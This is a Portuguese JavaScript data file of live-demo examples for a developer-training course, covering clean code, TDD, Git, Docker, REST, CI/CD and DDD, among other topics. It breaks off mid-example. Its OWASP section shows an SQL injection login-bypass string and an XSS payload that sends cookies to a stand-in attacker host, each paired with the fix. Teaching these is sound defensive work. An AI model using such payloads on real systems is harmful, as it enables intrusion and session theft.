/* ==========================================================================
   EXEMPLOS PRONTOS DAS PRÁTICAS
   Um item por tema, na mesma ordem de TEMAS (js/temas.js).
     intro .... o que o exemplo demonstra
     blocos ... arquivos de código ({ nome, codigo }) ou tabelas ({ nome, tabela })
     observar . o que o time deve notar ao acompanhar o exemplo
   O exemplo serve para a demonstração ao vivo. A sugestão de repetir a
   prática no ambiente do time continua em TEMAS[n].pratica.passos.
   Blocos com "rodar: true" são scripts completos: salve e execute com node.
   Dados de pessoas, cartões, métricas e sistemas são fictícios.
   ========================================================================== */

const PRATICAS = [
  /* 01 — Código Limpo */
  {
    intro: "Uma função de validação de cadastro refatorada em três commits: renomear, remover números mágicos e extrair funções.",
    blocos: [
      { nome: "cadastro.js (antes)", codigo: `function chk(u) {
  if (u.n && u.n.length > 2) {
    if (u.e && u.e.indexOf("@") > 0) {
      if (u.i >= 18) {
        return true;
      } else {
        return false;
      }
    } else {
      return false;
    }
  } else {
    return false;
  }
}` },
      { nome: "cadastro.js (depois)", rodar: true, codigo: `const IDADE_MINIMA = 18;
const TAMANHO_MINIMO_DO_NOME = 3;

const nomeEhValido = (nome) => Boolean(nome) && nome.length >= TAMANHO_MINIMO_DO_NOME;
const emailEhValido = (email) => Boolean(email) && email.indexOf("@") > 0;
const ehMaiorDeIdade = (idade) => idade >= IDADE_MINIMA;

function cadastroEhValido(usuario) {
  return (
    nomeEhValido(usuario.nome) &&
    emailEhValido(usuario.email) &&
    ehMaiorDeIdade(usuario.idade)
  );
}

console.log(cadastroEhValido({ nome: "Ana", email: "ana@empresa.com", idade: 30 })); // true
console.log(cadastroEhValido({ nome: "Jo", email: "jo@empresa.com", idade: 30 }));   // false` },
      { nome: "Sequência de commits", tabela: {
        colunas: ["Commit", "Mudança"],
        linhas: [
          ["refactor: renomeia chk para cadastroEhValido", "Nomes de função e de campos passam a revelar a intenção"],
          ["refactor: extrai constantes de validação", "18 e 2 viram IDADE_MINIMA e TAMANHO_MINIMO_DO_NOME"],
          ["refactor: extrai regras em funções pequenas", "Três níveis de if viram uma expressão que se lê como frase"]
        ]
      } }
    ],
    observar: "O comportamento não mudou em nenhum commit. Cada passo é pequeno o bastante para ser revisado em um minuto."
  },
  /* 02 — Testes e TDD */
  {
    intro: "O kata FizzBuzz resolvido com o ciclo vermelho, verde, refatorar, usando o executor de testes nativo do Node.",
    blocos: [
      { nome: "fizzbuzz.test.js", codigo: `// Execute com: node --test
const test = require("node:test");
const assert = require("node:assert");
const fizzbuzz = require("./fizzbuzz");

test("devolve o próprio número quando não é múltiplo de 3 nem de 5", () => {
  // Arrange + Act
  const resultado = fizzbuzz(1);
  // Assert
  assert.strictEqual(resultado, "1");
});

test("devolve Fizz para múltiplos de 3", () => {
  assert.strictEqual(fizzbuzz(9), "Fizz");
});

test("devolve Buzz para múltiplos de 5", () => {
  assert.strictEqual(fizzbuzz(10), "Buzz");
});

test("devolve FizzBuzz para múltiplos de 3 e de 5", () => {
  assert.strictEqual(fizzbuzz(30), "FizzBuzz");
});` },
      { nome: "fizzbuzz.js", codigo: `function fizzbuzz(numero) {
  const multiploDe = (divisor) => numero % divisor === 0;

  if (multiploDe(15)) return "FizzBuzz";
  if (multiploDe(3)) return "Fizz";
  if (multiploDe(5)) return "Buzz";
  return String(numero);
}

module.exports = fizzbuzz;` },
      { nome: "Os ciclos", tabela: {
        colunas: ["Ciclo", "Vermelho (teste que falha)", "Verde (código mínimo)"],
        linhas: [
          ["1", "fizzbuzz(1) deve ser \"1\"", "return String(numero)"],
          ["2", "fizzbuzz(9) deve ser \"Fizz\"", "if (numero % 3 === 0)"],
          ["3", "fizzbuzz(10) deve ser \"Buzz\"", "if (numero % 5 === 0)"],
          ["4", "fizzbuzz(30) deve ser \"FizzBuzz\"", "if (numero % 15 === 0), antes dos outros"],
          ["Refatorar", "Todos verdes", "Extrai multiploDe para remover a repetição"]
        ]
      } }
    ],
    observar: "O código de produção só cresce quando um teste pede. A refatoração acontece com todos os testes verdes."
  },
  /* 03 — Git */
  {
    intro: "Um histórico bagunçado reorganizado com rebase interativo, um bug localizado com bisect e um comentário de revisão reescrito.",
    blocos: [
      { nome: "terminal", codigo: `# 1. O histórico como está
git log --oneline
# a1b2c3d ajustes
# d4e5f6a wip
# 0718293 corrige typo
# 4a5b6c7 adiciona filtro por data no relatorio

# 2. Reorganizar os quatro últimos commits (nunca em branch compartilhada)
git rebase -i HEAD~4
#   pick   4a5b6c7 adiciona filtro por data no relatorio
#   fixup  0718293 corrige typo
#   fixup  d4e5f6a wip
#   reword a1b2c3d ajustes

# 3. Resultado
git log --oneline
# 9f8e7d6 fix: corrige fuso horário no filtro por data
# 3c2b1a0 feat: adiciona filtro por data no relatório

# 4. Achar o commit que introduziu um bug
git bisect start
git bisect bad                 # a versão atual tem o bug
git bisect good v1.4.0         # esta versão não tinha
git bisect run npm test        # o Git testa commit a commit sozinho
git bisect reset` },
      { nome: "Comentários de revisão", tabela: {
        colunas: ["Em vez de", "Escreva"],
        linhas: [
          ["Isso está errado.", "Com lista vazia este trecho lança erro. Vale tratar o caso antes do laço?"],
          ["Por que você fez assim?", "Qual foi o motivo de consultar o banco dentro do laço? Fiquei pensando no volume em produção."],
          ["Renomeia isso.", "Sugestão: totalComDesconto deixaria claro que o desconto já foi aplicado."]
        ]
      } }
    ],
    observar: "O histórico final conta o que mudou e por quê. O comentário bom descreve o problema e deixa a decisão com quem escreveu."
  },
  /* 04 — IA no dia a dia */
  {
    intro: "A mesma tarefa pedida de três formas. Rode os três prompts no assistente do time e compare as respostas.",
    blocos: [
      { nome: "Prompt 1 — vago", codigo: `Faz uma função para validar CPF.` },
      { nome: "Prompt 2 — com contexto e restrições", codigo: `Escreva uma função em TypeScript que valide um CPF.

Contexto: API Node 22, sem dependências externas, padrão do projeto
é função pura exportada por nome.

Requisitos:
- Aceitar a entrada com ou sem pontuação
- Rejeitar sequências repetidas, como 111.111.111-11
- Validar os dois dígitos verificadores
- Devolver boolean, sem lançar exceção` },
      { nome: "Prompt 3 — com exemplos e formato de saída", codigo: `Escreva uma função em TypeScript que valide um CPF.

Contexto: API Node 22, sem dependências externas, padrão do projeto
é função pura exportada por nome.

Exemplos do comportamento esperado:
  validarCpf("529.982.247-25")  -> true
  validarCpf("52998224725")     -> true
  validarCpf("111.111.111-11")  -> false
  validarCpf("529.982.247-26")  -> false
  validarCpf("")                -> false

Formato da resposta:
1. O arquivo validar-cpf.ts
2. O arquivo validar-cpf.test.ts cobrindo os exemplos acima
3. Uma lista curta dos casos de borda que você NÃO tratou` },
      { nome: "Como comparar", tabela: {
        colunas: ["Critério", "O que verificar em cada resposta"],
        linhas: [
          ["Correção", "Os cinco exemplos passam quando o teste é executado?"],
          ["Aderência", "Seguiu a linguagem, o padrão do projeto e a restrição de dependências?"],
          ["Completude", "Tratou pontuação, sequência repetida e entrada vazia?"],
          ["Revisão", "Quanto tempo a pessoa levou para entender e confiar no código?"]
        ]
      } }
    ],
    observar: "O prompt 1 obriga o modelo a adivinhar. Os exemplos do prompt 3 funcionam como testes de aceitação do pedido."
  },
  /* 05 — SOLID */
  {
    intro: "Três trechos para a caça às violações. Esconda os comentários de resposta e deixe os grupos discutirem.",
    blocos: [
      { nome: "trecho-1.js", codigo: `class Funcionario {
  calcularSalario() { /* regra do financeiro */ }
  salvarNoBanco() { /* SQL */ }
  gerarRelatorioEmPdf() { /* layout */ }
}

// Resposta: Responsabilidade Única.
// Três motivos para mudar: financeiro, banco de dados e layout.` },
      { nome: "trecho-2.js", codigo: `function calcularArea(forma) {
  if (forma.tipo === "circulo") return Math.PI * forma.raio * forma.raio;
  if (forma.tipo === "retangulo") return forma.largura * forma.altura;
  // cada forma nova exige editar esta função
}

// Resposta: Aberto/Fechado.
// Solução: cada forma sabe calcular a própria área (forma.area()).` },
      { nome: "trecho-3.js", codigo: `class Ave {
  voar() { return "voando"; }
}

class Pinguim extends Ave {
  voar() { throw new Error("Pinguim não voa"); }
}

function migrar(aves) {
  return aves.map((ave) => ave.voar());   // quebra se houver um Pinguim
}

// Resposta: Substituição de Liskov.
// Solução: separar Ave de AveQueVoa; Pinguim herda só de Ave.` },
      { nome: "trecho-3-corrigido.js", rodar: true, codigo: `class Ave {
  comer() { return "comendo"; }
}

class AveQueVoa extends Ave {
  voar() { return "voando"; }
}

class Andorinha extends AveQueVoa {}
class Pinguim extends Ave {}

function migrar(avesQueVoam) {
  return avesQueVoam.map((ave) => ave.voar());
}

console.log(migrar([new Andorinha(), new Andorinha()])); // [ 'voando', 'voando' ]
console.log(new Pinguim().comer());                      // comendo` }
    ],
    observar: "Em cada trecho, a pergunta que revela a violação é a mesma: o que precisa ser editado quando chegar um requisito novo?"
  },
  /* 06 — Docker */
  {
    intro: "Uma API Node com banco PostgreSQL: imagem pequena com multi-stage build e ambiente completo em um comando.",
    blocos: [
      { nome: "Dockerfile", codigo: `# Estágio 1: instala dependências e compila
FROM node:22-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Estágio 2: imagem final, só com o necessário para executar
FROM node:22-alpine
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --omit=dev
COPY --from=build /app/dist ./dist
USER node
EXPOSE 3000
CMD ["node", "dist/server.js"]` },
      { nome: "docker-compose.yml", codigo: `services:
  api:
    build: .
    ports:
      - "3000:3000"
    environment:
      DATABASE_URL: postgres://app:treino@banco:5432/app
    depends_on:
      banco:
        condition: service_healthy

  banco:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: app
      POSTGRES_PASSWORD: treino
      POSTGRES_DB: app
    volumes:
      - dados:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U app"]
      interval: 5s
      retries: 5

volumes:
  dados:` },
      { nome: "terminal", codigo: `docker build -t minha-api .
docker images minha-api          # compare o tamanho com e sem multi-stage
docker compose up -d             # sobe API e banco
docker compose logs -f api
docker compose down              # o volume "dados" preserva o banco` }
    ],
    observar: "A API encontra o banco pelo nome do serviço (banco). Copiar o package.json antes do código aproveita o cache de camadas."
  },
  /* 07 — Times ágeis */
  {
    intro: "Cálculo de cycle time e throughput a partir de cartões exportados do quadro (dados fictícios).",
    blocos: [
      { nome: "Cartões concluídos", tabela: {
        colunas: ["Cartão", "Início", "Conclusão", "Cycle time"],
        linhas: [
          ["APP-101", "01/03", "04/03", "3 dias"],
          ["APP-102", "01/03", "12/03", "11 dias"],
          ["APP-103", "03/03", "05/03", "2 dias"],
          ["APP-104", "04/03", "09/03", "5 dias"],
          ["APP-105", "08/03", "22/03", "14 dias"],
          ["APP-106", "10/03", "13/03", "3 dias"],
          ["APP-107", "15/03", "19/03", "4 dias"],
          ["APP-108", "16/03", "24/03", "8 dias"]
        ]
      } },
      { nome: "metricas.js", rodar: true, codigo: `const cartoes = [
  { id: "APP-101", inicio: "2027-03-01", fim: "2027-03-04" },
  { id: "APP-102", inicio: "2027-03-01", fim: "2027-03-12" },
  { id: "APP-103", inicio: "2027-03-03", fim: "2027-03-05" },
  { id: "APP-104", inicio: "2027-03-04", fim: "2027-03-09" },
  { id: "APP-105", inicio: "2027-03-08", fim: "2027-03-22" },
  { id: "APP-106", inicio: "2027-03-10", fim: "2027-03-13" },
  { id: "APP-107", inicio: "2027-03-15", fim: "2027-03-19" },
  { id: "APP-108", inicio: "2027-03-16", fim: "2027-03-24" },
];

const UM_DIA = 24 * 60 * 60 * 1000;
const ciclos = cartoes
  .map((c) => (new Date(c.fim) - new Date(c.inicio)) / UM_DIA)
  .sort((a, b) => a - b);

const media = ciclos.reduce((soma, dias) => soma + dias, 0) / ciclos.length;
const percentil = (p) => ciclos[Math.ceil((p / 100) * ciclos.length) - 1];
const semanas = 4;

console.log("Cycle time médio:", media.toFixed(1), "dias");          // 6.3 dias
console.log("Percentil 85:", percentil(85), "dias");                  // 11 dias
console.log("Throughput:", cartoes.length / semanas, "itens/semana"); // 2 itens/semana` }
    ],
    observar: "A média (6,3 dias) esconde os itens lentos. A frase útil para o cliente é: 85% dos itens ficam prontos em até 11 dias."
  },
  /* 08 — APIs REST */
  {
    intro: "Três endpoints inconsistentes redesenhados e o contrato escrito em OpenAPI antes do código.",
    blocos: [
      { nome: "Revisão dos endpoints", tabela: {
        colunas: ["Antes", "Problema", "Depois"],
        linhas: [
          ["POST /getPedidos", "Verbo na URL e POST para leitura", "GET /pedidos?status=aberto&pagina=1"],
          ["GET /pedido/delete/42", "GET que altera dados", "DELETE /pedidos/42 → 204"],
          ["POST /pedidos → 200 com { erro: true }", "Status não reflete o resultado", "POST /pedidos → 201 ou 422 com detalhes"]
        ]
      } },
      { nome: "openapi.yaml", codigo: `openapi: 3.1.0
info:
  title: API de Pedidos
  version: 1.0.0
paths:
  /pedidos:
    get:
      summary: Lista pedidos
      parameters:
        - { name: status, in: query, schema: { type: string, enum: [aberto, pago, cancelado] } }
        - { name: pagina, in: query, schema: { type: integer, minimum: 1, default: 1 } }
      responses:
        "200":
          description: Página de pedidos
          content:
            application/json:
              schema:
                type: object
                properties:
                  itens: { type: array, items: { $ref: "#/components/schemas/Pedido" } }
                  proximaPagina: { type: [integer, "null"] }
    post:
      summary: Cria um pedido
      responses:
        "201": { description: Pedido criado }
        "422":
          description: Dados inválidos
          content:
            application/problem+json:
              schema: { $ref: "#/components/schemas/Erro" }
components:
  schemas:
    Pedido:
      type: object
      required: [id, status, total]
      properties:
        id: { type: integer }
        status: { type: string }
        total: { type: number }
    Erro:
      type: object
      properties:
        type: { type: string }
        title: { type: string }
        detail: { type: string }` },
      { nome: "Erro no padrão Problem Details", codigo: `HTTP/1.1 422 Unprocessable Content
Content-Type: application/problem+json

{
  "type": "https://api.empresa.com/erros/dados-invalidos",
  "title": "Dados inválidos",
  "detail": "A quantidade deve ser maior que zero.",
  "campo": "itens[0].quantidade"
}` }
    ],
    observar: "Com o contrato pronto, o front e o mobile geram um servidor de mock e começam a trabalhar antes de o back terminar."
  },
  /* 09 — Performance web */
  {
    intro: "As correções de maior impacto em uma página lenta e um orçamento de performance para o pipeline.",
    blocos: [
      { nome: "pagina.html (antes)", codigo: `<head>
  <link rel="stylesheet" href="tudo.css">
  <script src="biblioteca-grande.js"></script>
  <script src="app.js"></script>
</head>
<body>
  <img src="banner-4000px.png">
  <img src="produto-1.png">
  <img src="produto-2.png">
</body>` },
      { nome: "pagina.html (depois)", codigo: `<head>
  <link rel="preload" as="image" href="banner-1200.webp">
  <link rel="stylesheet" href="critico.css">
  <script src="app.js" defer></script>
</head>
<body>
  <!-- Imagem principal: tamanho declarado e prioridade alta -->
  <img src="banner-1200.webp" width="1200" height="400"
       fetchpriority="high" alt="Promoção de inverno">

  <!-- Imagens abaixo da dobra: carregam só quando se aproximam da tela -->
  <img src="produto-1.webp" width="300" height="300" loading="lazy" alt="Tênis azul">
  <img src="produto-2.webp" width="300" height="300" loading="lazy" alt="Mochila preta">
</body>` },
      { nome: "budget.json (Lighthouse)", codigo: `[
  {
    "path": "/*",
    "timings": [
      { "metric": "largest-contentful-paint", "budget": 2500 },
      { "metric": "cumulative-layout-shift", "budget": 0.1 }
    ],
    "resourceSizes": [
      { "resourceType": "script", "budget": 300 },
      { "resourceType": "image", "budget": 500 }
    ]
  }
]` },
      { nome: "O que cada mudança ataca", tabela: {
        colunas: ["Mudança", "Métrica"],
        linhas: [
          ["Banner menor, em WebP, com preload e prioridade alta", "LCP"],
          ["width e height em todas as imagens", "CLS"],
          ["Script com defer e sem biblioteca desnecessária", "LCP e INP"],
          ["loading=\"lazy\" abaixo da dobra", "Peso inicial da página"]
        ]
      } }
    ],
    observar: "Meça antes e depois na mesma máquina e na mesma rede simulada. Os tamanhos do orçamento estão em kilobytes e os tempos em milissegundos."
  },
  /* 10 — OWASP Top 10 */
  {
    intro: "As duas falhas mais clássicas, cada uma com o ataque e a correção. Use somente em aplicação de treino local.",
    blocos: [
      { nome: "login.js — SQL injection", codigo: `// VULNERÁVEL: a entrada vira parte do comando SQL
const sql = "SELECT * FROM usuarios WHERE email = '" + email + "' AND senha = '" + senha + "'";
await db.query(sql);

// Entrada do atacante no campo e-mail:   ' OR '1'='1' --
// Comando executado:
//   SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = ''
// Resultado: a condição é sempre verdadeira e o login é aceito sem senha.

// CORRIGIDO: consulta parametrizada. A entrada nunca é interpretada como SQL.
await db.query("SELECT * FROM usuarios WHERE email = $1", [email]);
// A senha é comparada depois, contra o hash armazenado.` },
      { nome: "comentarios.js — XSS", codigo: `// VULNERÁVEL: o texto do usuário é interpretado como HTML
lista.innerHTML += "<li>" + comentario.texto + "</li>";

// Comentário enviado pelo atacante:
//   <img src=x onerror="fetch('https://site-do-atacante.example/?c=' + document.cookie)">
// Resultado: o script roda no navegador de todo mundo que abrir a página.

// CORRIGIDO: o texto é tratado como texto
const item = document.createElement("li");
item.textContent = comentario.texto;
lista.appendChild(item);` },
      { nome: "Checklist de segurança para o code review", tabela: {
        colunas: ["Pergunta", "Se a resposta for não"],
        linhas: [
          ["Toda consulta usa parâmetros?", "Risco de injeção"],
          ["A permissão é verificada no servidor, por recurso?", "Usuário acessa dado de outro trocando o ID"],
          ["Todo dado do usuário é escapado ao ser exibido?", "Risco de XSS"],
          ["Segredos estão fora do código e do repositório?", "Vazamento de credenciais"],
          ["As mensagens de erro escondem detalhes internos?", "Atacante aprende sobre o sistema"]
        ]
      } }
    ],
    observar: "As duas falhas têm a mesma raiz: dados do usuário misturados com código. A correção separa uma coisa da outra."
  },
  /* 11 — Refatoração */
  {
    intro: "Testes de caracterização para o kata Gilded Rose: primeiro fotografar o comportamento atual, depois refatorar.",
    blocos: [
      { nome: "gilded-rose.test.js", codigo: `// Execute com: node --test
const test = require("node:test");
const assert = require("node:assert");
const { Shop, Item } = require("./gilded_rose");

function depoisDeUmDia(nome, prazo, qualidade) {
  const [item] = new Shop([new Item(nome, prazo, qualidade)]).updateQuality();
  return [item.sellIn, item.quality];
}

test("item comum perde 1 de qualidade por dia", () => {
  assert.deepStrictEqual(depoisDeUmDia("Elixir", 5, 10), [4, 9]);
});

test("item comum vencido perde qualidade em dobro", () => {
  assert.deepStrictEqual(depoisDeUmDia("Elixir", 0, 10), [-1, 8]);
});

test("qualidade nunca fica negativa", () => {
  assert.deepStrictEqual(depoisDeUmDia("Elixir", 5, 0), [4, 0]);
});

test("Aged Brie ganha qualidade com o tempo", () => {
  assert.deepStrictEqual(depoisDeUmDia("Aged Brie", 5, 10), [4, 11]);
});

test("qualidade nunca passa de 50", () => {
  assert.deepStrictEqual(depoisDeUmDia("Aged Brie", 5, 50), [4, 50]);
});

test("Sulfuras não muda", () => {
  assert.deepStrictEqual(depoisDeUmDia("Sulfuras, Hand of Ragnaros", 5, 80), [5, 80]);
});

test("ingresso vale zero depois do show", () => {
  const ingresso = "Backstage passes to a TAFKAL80ETC concert";
  assert.deepStrictEqual(depoisDeUmDia(ingresso, 0, 20), [-1, 0]);
});` },
      { nome: "Roteiro da sessão", tabela: {
        colunas: ["Etapa", "O que fazer", "Regra"],
        linhas: [
          ["1. Fotografar", "Escrever os testes acima sem mexer no código", "Se o teste falhar, corrija o teste: o código é a verdade"],
          ["2. Refatorar", "Extrair uma função por tipo de item", "Rodar os testes a cada mudança"],
          ["3. Evoluir", "Adicionar o item Conjured, que perde qualidade em dobro", "Primeiro o teste novo, depois o código"]
        ]
      } }
    ],
    observar: "Os testes não julgam se o comportamento está certo. Eles garantem que a refatoração não mudou nada sem querer."
  },
  /* 12 — Dívida técnica */
  {
    intro: "Um inventário de dívida técnica preenchido (itens fictícios), no formato que cada setor deve trazer.",
    blocos: [
      { nome: "Inventário", tabela: {
        colunas: ["Item", "Juros que pagamos hoje", "Impacto", "Esforço", "Decisão"],
        linhas: [
          ["Módulo de relatórios sem testes", "Toda alteração exige dois dias de teste manual", "Alto", "Médio", "Pagar junto com a próxima funcionalidade de relatórios"],
          ["Biblioteca de autenticação três versões atrás", "Vulnerabilidades conhecidas sem correção", "Alto", "Baixo", "Entra no próximo ciclo"],
          ["App mobile com duas bibliotecas de navegação", "Bugs de navegação recorrentes e curva de aprendizado", "Médio", "Alto", "Planejar para o segundo trimestre"],
          ["Scripts de deploy manuais em homologação", "Uma hora por publicação e erros de digitação", "Médio", "Baixo", "Entra no próximo ciclo"],
          ["Nomes de tabelas fora do padrão", "Estranheza para quem chega", "Baixo", "Alto", "Não pagar por enquanto"]
        ]
      } },
      { nome: "Como apresentar para a diretoria", codigo: `Em vez de:
  "Precisamos refatorar o módulo de relatórios porque o código está ruim."

Diga:
  "Cada alteração em relatórios custa hoje dois dias extras de teste manual.
   Foram seis alterações no último trimestre: doze dias de trabalho.
   Com cinco dias de investimento em testes automatizados, esse custo
   cai para perto de zero e o risco de erro em produção diminui."` }
    ],
    observar: "Impacto alto com esforço baixo se paga primeiro. Decidir conscientemente não pagar um item também é uma decisão válida."
  },
  /* 13 — Arquitetura Limpa */
  {
    intro: "O caso de uso Cadastrar Cliente completo em um arquivo, sem framework e testado com um repositório em memória.",
    blocos: [
      { nome: "cadastrar-cliente.js", rodar: true, codigo: `const assert = require("node:assert");

// ---------- Domínio: regras que valem em qualquer aplicação ----------
class Cliente {
  static criar({ nome, email, idade }) {
    if (idade < 18) throw new Error("Cliente deve ser maior de idade");
    const cliente = new Cliente();
    cliente.id = "cli-" + Math.random().toString(36).slice(2, 8);
    cliente.nome = nome;
    cliente.email = email;
    return cliente;
  }
}

// ---------- Aplicação: o caso de uso. Não conhece HTTP nem SQL ----------
class CadastrarCliente {
  constructor(clientes, notificador) {
    this.clientes = clientes;        // porta: existeComEmail, salvar
    this.notificador = notificador;  // porta: boasVindas
  }

  async executar(dados) {
    const cliente = Cliente.criar(dados);
    if (await this.clientes.existeComEmail(cliente.email)) {
      throw new Error("E-mail já cadastrado");
    }
    await this.clientes.salvar(cliente);
    await this.notificador.boasVindas(cliente);
    return cliente.id;
  }
}

// ---------- Adaptadores usados no teste ----------
class ClientesEmMemoria {
  constructor() { this.itens = []; }
  async existeComEmail(email) { return this.itens.some((c) => c.email === email); }
  async salvar(cliente) { this.itens.push(cliente); }
}

class NotificadorFalso {
  constructor() { this.enviados = []; }
  async boasVindas(cliente) { this.enviados.push(cliente.email); }
}

// ---------- Teste: roda em milissegundos, sem banco e sem rede ----------
(async () => {
  const clientes = new ClientesEmMemoria();
  const notificador = new NotificadorFalso();
  const cadastrar = new CadastrarCliente(clientes, notificador);
  const ana = { nome: "Ana", email: "ana@empresa.com", idade: 30 };

  const id = await cadastrar.executar(ana);
  assert.ok(id);
  assert.strictEqual(clientes.itens.length, 1);
  assert.deepStrictEqual(notificador.enviados, ["ana@empresa.com"]);

  await assert.rejects(() => cadastrar.executar(ana), /já cadastrado/);
  await assert.rejects(
    () => cadastrar.executar({ nome: "Leo", email: "leo@empresa.com", idade: 15 }),
    /maior de idade/
  );
  console.log("Todos os cenários passaram");
})();` },
      { nome: "clientes-postgres.js (adaptador de produção)", codigo: `// Implementa a mesma porta. O caso de uso não muda uma linha.
class ClientesPostgres {
  constructor(db) { this.db = db; }

  async existeComEmail(email) {
    const { rows } = await this.db.query("SELECT 1 FROM clientes WHERE email = $1", [email]);
    return rows.length > 0;
  }

  async salvar(cliente) {
    await this.db.query(
      "INSERT INTO clientes (id, nome, email) VALUES ($1, $2, $3)",
      [cliente.id, cliente.nome, cliente.email]
    );
  }
}

// Na inicialização da aplicação (a borda do sistema):
// const cadastrar = new CadastrarCliente(new ClientesPostgres(db), new NotificadorEmail(smtp));` }
    ],
    observar: "As dependências apontam para dentro: o adaptador conhece o caso de uso, e o caso de uso só conhece a porta."
  },
  /* 14 — CI/CD */
  {
    intro: "Um pipeline completo em GitLab CI: verificação, testes, empacotamento e publicação em homologação com aprovação manual.",
    blocos: [
      { nome: ".gitlab-ci.yml", codigo: `stages: [verificar, testar, empacotar, publicar]

default:
  image: node:22
  cache:
    key:
      files: [package-lock.json]     # o cache só muda quando as dependências mudam
    paths: [.npm/]
  before_script:
    - npm ci --cache .npm --prefer-offline

lint:
  stage: verificar                   # o mais rápido primeiro: falhar cedo
  script: npm run lint

testes:
  stage: testar
  script: npm test

build:
  stage: empacotar
  script: npm run build
  artifacts:
    paths: [dist/]                   # o mesmo artefato segue para a publicação

homologacao:
  stage: publicar
  script: ./scripts/publicar.sh homologacao
  environment: homologacao
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                   # exige um clique de aprovação` },
      { nome: "Medindo o ganho do cache", tabela: {
        colunas: ["Execução", "O que observar"],
        linhas: [
          ["Primeira, sem cache", "Anote o tempo do passo npm ci em cada job"],
          ["Segunda, com cache", "O mesmo passo deve cair bastante: compare os dois tempos"],
          ["Após alterar o package-lock.json", "O cache é refeito uma vez e volta a valer"]
        ]
      } }
    ],
    observar: "O build acontece uma única vez e o artefato é promovido. Em GitHub Actions a estrutura é a mesma, com outra sintaxe."
  },
  /* 15 — Testes de API e contrato */
  {
    intro: "Testes de um endpoint cobrindo o caminho feliz, o esquema da resposta e três erros, sem bibliotecas externas.",
    blocos: [
      { nome: "pedidos.api.test.js", codigo: `// Execute com: API_URL=http://localhost:3000 node --test
const test = require("node:test");
const assert = require("node:assert");

const API = process.env.API_URL;
const json = { "Content-Type": "application/json" };

async function criarPedido(corpo) {
  return fetch(API + "/pedidos", { method: "POST", headers: json, body: JSON.stringify(corpo) });
}

test("cria um pedido válido", async () => {
  const resposta = await criarPedido({ clienteId: 1, itens: [{ produtoId: 10, quantidade: 2 }] });
  assert.strictEqual(resposta.status, 201);

  // Contrato: campos e tipos que front e mobile esperam
  const pedido = await resposta.json();
  assert.strictEqual(typeof pedido.id, "number");
  assert.strictEqual(pedido.status, "aberto");
  assert.strictEqual(typeof pedido.total, "number");
  assert.ok(Array.isArray(pedido.itens));
});

test("rejeita pedido sem itens", async () => {
  const resposta = await criarPedido({ clienteId: 1, itens: [] });
  assert.strictEqual(resposta.status, 422);
  assert.match(resposta.headers.get("content-type"), /problem[+]json/);
});

test("rejeita quantidade negativa", async () => {
  const resposta = await criarPedido({ clienteId: 1, itens: [{ produtoId: 10, quantidade: -1 }] });
  assert.strictEqual(resposta.status, 422);
});

test("devolve 404 para pedido inexistente", async () => {
  const resposta = await fetch(API + "/pedidos/999999");
  assert.strictEqual(resposta.status, 404);
});` },
      { nome: "Quebrando o contrato de propósito", tabela: {
        colunas: ["Mudança no back-end", "O que acontece"],
        linhas: [
          ["Renomear total para valorTotal", "O primeiro teste falha no pipeline, antes do merge"],
          ["Trocar id de número para texto", "Falha na verificação de tipo"],
          ["Adicionar o campo desconto", "Nada quebra: adicionar campo é compatível"]
        ]
      } }
    ],
    observar: "Cada teste cria os próprios dados e não depende de outro. As verificações de tipo são o contrato escrito em código."
  },
  /* 16 — DDD */
  {
    intro: "Resultado de um Event Storming do fluxo de compra de uma loja virtual (exemplo fictício) e o conceito de linguagem ubíqua no código.",
    blocos: [
      { nome: "Eventos mapeados", tabela: {
        colunas: ["Comando (ação)", "Evento (fato, no passado)", "Contexto delimitado"],
        linhas: [
          ["Adicionar ao carrinho", "Item adicionado ao carrinho", "Vendas"],
          ["Fechar pedido", "Pedido realizado", "Vendas"],
          ["Cobrar cliente", "Pagamento aprovado / Pagamento recusado", "Pagamentos"],
          ["Reservar item", "Estoque reservado", "Estoque"],
          ["Despachar pedido", "Pedido enviado", "Logística"],
          ["Confirmar recebimento", "Pedido entregue", "Logística"]
        ]
      } },
      { nome: "A mesma palavra, modelos diferentes", tabela: {
        colunas: ["Contexto", "O que \"Produto\" significa ali"],
        linhas: [
          ["Vendas", "Nome, preço, fotos e descrição"],
          ["Estoque", "Código, quantidade disponível e localização no depósito"],
          ["Logística", "Peso, dimensões e restrições de transporte"]
        ]
      } },
      { nome: "dinheiro.js — um objeto de valor", rodar: true, codigo: `// Objeto de valor: definido pelos atributos, imutável e com as regras junto.
class Dinheiro {
  constructor(centavos, moeda = "BRL") {
    if (!Number.isInteger(centavos)) throw new Error("Use centavos inteiros");
    this.centavos = centavos;
    this.moeda = moeda;
    Object.freeze(this);
  }

  somar(outro) {
    if (outro.moeda !== this.moeda) throw new Error("Moedas diferentes");
    return new Dinheiro(this.centavos + outro.centavos, this.moeda);
  }

  igualA(outro) {
    return this.centavos === outro.centavos && this.moeda === outro.moeda;
  }
}

const frete = new Dinheiro(1990);
const produto = new Dinheiro(15000);
console.log(produto.somar(frete).centavos);              // 16990
console.log(new Dinheiro(1990).igualA(frete));           // true` }
    ],
    observar: "Onde a mesma palavra muda de significado existe uma fronteira de contexto. Tentar um modelo único de Produto para tudo gera uma classe gigante."
  },
  /* 17 — Arquitetura mobile */
  {
    intro: "A lógica de uma fila de sincronização offline, em JavaScript para ser independente de plataforma. A mesma ideia vale em Kotlin, Swift ou Dart.",
    blocos: [
      { nome: "fila-de-sincronizacao.js", rodar: true, codigo: `class FilaDeSincronizacao {
  constructor(api) {
    this.api = api;
    this.pendentes = [];     // em um app real, fica no banco local
    this.online = false;
  }

  async executar(acao) {
    if (!this.online) {
      this.pendentes.push(acao);
      return "enfileirada";
    }
    await this.api.enviar(acao);
    return "enviada";
  }

  async reconectar() {
    this.online = true;
    while (this.pendentes.length > 0) {
      const acao = this.pendentes[0];
      await this.api.enviar(acao);   // se falhar, a ação continua na fila
      this.pendentes.shift();
    }
  }
}

// Simulação
const servidor = [];
const api = { enviar: async (acao) => servidor.push(acao) };
const fila = new FilaDeSincronizacao(api);

(async () => {
  // Usuário no modo avião
  console.log(await fila.executar({ id: "a1", tipo: "curtir", post: 7 }));    // enfileirada
  console.log(await fila.executar({ id: "a2", tipo: "comentar", post: 7 }));  // enfileirada
